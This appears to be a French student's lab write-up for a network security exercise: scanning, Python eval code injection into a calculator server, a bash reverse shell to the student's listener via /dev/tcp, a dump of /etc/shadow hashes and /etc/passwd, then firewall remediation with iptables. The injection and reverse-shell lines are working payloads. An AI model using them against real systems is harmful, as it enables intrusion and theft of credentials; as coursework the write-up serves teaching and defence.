# 1. Reconnaissance

🌞 Déterminer

🦈[voir capture WIRESHARK](./Wireshark/TP5_Determiner.pcapng)


🌞 Scanner le réseau

trouvez une ou plusieurs machines qui héberge une app sur ce port

🦈[voir capture WIRESHARK](./Wireshark/p5_nmap.pcapng)


🌞 Connectez-vous au serveur

```
tom@Tom:~/Documents/B2-Reseau$ /bin/python3 /home/tom/Documents/B2-Reseau/tp5/client.py

```
C'est une calculattrice 

🌞 Injecter du code serveur

```

    userMessage = "__import__('os').popen('ls').read()"

```
```
tom@Tom:~/Documents/B2-Reseau$ /bin/python3 /home/tom/Documents/B2-Reseau/tp5/client.py
'afs\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nva
```
# 3. Reverse shell


🌞 Obtenez un reverse shell sur le serveur

```
PS C:\Users\tomma\Ynov\B2> ncat -lvp 5555
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.33.66.78.
Ncat: Connection from 10.33.66.78:54046.
bash: cannot set terminal process group (1480): Inappropriate ioctl for device
bash: no job control in this shell
[root@localhost /]#
```
```
PS C:\Users\tomma> ncat 10.33.66.78 13339
g
Hello__import__('os').popen('bash -i >& /dev/tcp/10.33.73.72/5555 0>&1').read()
```
🌞 Pwn
```
[root@localhost etc]# cat shadow
cat shadow
root:$6$.8fzl//9C0M819BS$Sw1mrG49Md8cyNUn0Ai0vlthhzuSZpJ/XVfersVmgXDSBrTVchneIWHYHnT3mC/NutmPS03TneWAHihO0NXrj1::0:99999:7:::
bin:*:19820:0:99999:7:::
daemon:*:19820:0:99999:7:::
adm:*:19820:0:99999:7:::
lp:*:19820:0:99999:7:::
sync:*:19820:0:99999:7:::
shutdown:*:19820:0:99999:7:::
halt:*:19820:0:99999:7:::
mail:*:19820:0:99999:7:::
operator:*:19820:0:99999:7:::
games:*:19820:0:99999:7:::
ftp:*:19820:0:99999:7:::
nobody:*:19820:0:99999:7:::
systemd-coredump:!!:20010::::::
dbus:!!:20010::::::
tss:!!:20010::::::
sssd:!!:20010::::::
sshd:!!:20010::::::
chrony:!!:20010::::::
it4:$6$HTSBHGoZflJxXu9u$i54higNbS5p2zVOLWP6P33D39SyWRrEAOjzh97xRa15KzJU3jZfBi/XIPY3FKDoYoSvo1FrirBwNcgmEVpaPK/::0:99999:7:::
tcpdump:!!:20010::::::
```
```
[root@localhost etc]# cat passwd
cat passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/:/usr/sbin/nologin
sssd:x:998:996:User for sssd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/usr/sbin/nologin
chrony:x:997:995:chrony system user:/var/lib/chrony:/sbin/nologin
it4:x:1000:1000:it4:/home/it4:/bin/bash
tcpdump:x:72:72::/:/sbin/nologin
```
# 4. Bonus : DOS
⭐ BONUS : DOS l'application
```

```
# II. Remédiation
 

🌞 Proposer une remédiation système
```
Mettre en place un pare-feu pour bloquer les ports entrants non nécessaires, en autorisant uniquement ceux essentiels au fonctionnement des services.

- **Port 22** : Service SSH qui permet de se connecter.
- **Port 13337** : Le port qui fait tourner le serveur.

```


🌞 Proposer une remédiation système
```
iptables -t filter -P INPUT DROP; iptables -A INPUT -p tcp --dport 22 -j ACCEPT; iptables -A INPUT -p tcp --dport 13337 -j ACCEPT

```
```
Avec cette commande seul les connexions les port 22 et 13337 sont autorisé. Bloquer ses ports réduit les chances de découvrir des services vulnérables qui pourraient fonctionner sur d'autres ports.
```


